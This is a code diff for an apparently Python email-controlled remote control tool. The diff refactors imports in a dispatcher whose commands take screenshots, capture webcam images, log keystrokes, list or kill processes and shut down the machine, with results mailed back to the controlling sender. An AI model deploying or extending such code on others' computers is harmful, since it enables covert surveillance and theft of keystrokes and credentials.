@@ -1,10 +1,10 @@
-import mail_handle_receive
-from mail_handle_send import *
-import message_generate
-import system_control
+import resource.mail_handle_receive as mail_handle_receive
+import resource.mail_handle_send as mail_handle_send
+import resource.message_generate as message_generate
+import resource.system_control as system_control
+import resource.keylogr as keylogr
+import resource.resource_monitor as resource_monitor
 import datetime
-import keylogr
-import resource_monitor
 import time
 import re
 import os
@@ -16,11 +16,10 @@ function_map = {
     'screenshot': system_control.screenshot,
     'webcam': system_control.webcam_image,
     'keylog': keylogr.keylog,
-    # 'open_app': resource_monitor.open_app,
-    # 'close_app': resource_monitor.close_app,
     'list_apps': resource_monitor.getAppInfo,
     'list_processes': resource_monitor.list_processes,
 }
+
 
 def request_handle(msg_list):
     if msg_list == None:
@@ -33,32 +32,40 @@ def request_handle(msg_list):
         try:
             if cmd == "help":
                 message = message_generate.help()
-                send_mail_success_execution(recipient_mail, message)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message)
             elif cmd == "list_processes" or cmd == "list_apps":
                 data = function_map[cmd]()
-                message = message_generate.DataFormat(data)
-                send_mail_success_execution(recipient_mail,message)
+                message = message_generate.DataFormat(data, cmd)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message)
             elif cmd == "shutdown":
                 message = message_generate.success_message(cmd)
-                send_mail_success_execution(recipient_mail, message)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message)
                 function_map[cmd]()
             elif cmd == "keylog" or cmd == "screenshot" or cmd == "webcam":
                 filename = function_map[cmd]()
                 message = message_generate.success_message(cmd)
-                send_mail_success_execution(recipient_mail, message, filename)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message, filename)
             elif cmd.startswith('kill_process'):
                 splitted = cmd.split(' ')
                 function_map[splitted[0]](int(splitted[1]))
                 message = message_generate.success_message(cmd)
-                send_mail_success_execution(recipient_mail, message)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message)
             else:
                 function_map[cmd]()
                 message = message_generate.success_message(cmd)
-                send_mail_success_execution(recipient_mail, message)
+                mail_handle_send.send_mail_success_execution(
+                    recipient_mail, message)
         except Exception as e:
             print(e)
             message = message_generate.failure_message(cmd)
-            send_mail_failure_execution(recipient_mail, message)
+            mail_handle_send.send_mail_failure_execution(
+                recipient_mail, message)
+
 
 def waiting(message):
     print('', end='\r')
